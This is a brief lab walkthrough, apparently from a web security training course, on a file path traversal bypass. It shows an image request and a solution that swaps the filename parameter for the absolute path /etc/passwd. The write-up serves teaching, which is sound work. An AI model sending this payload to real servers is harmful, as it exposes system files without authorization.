Lab #2: File path traversal, traversal sequences blocked with absolute path bypass


Target: Get access to the content of /etc/passwd

Analysis:

The image files are loaded with Get request, but your traversal string is ineffective:

GET /image?filename=72.jpg

solution:
send the request to the repeater and change the filename parameter using the exact path:

GET /image?filename=/etc/passwd
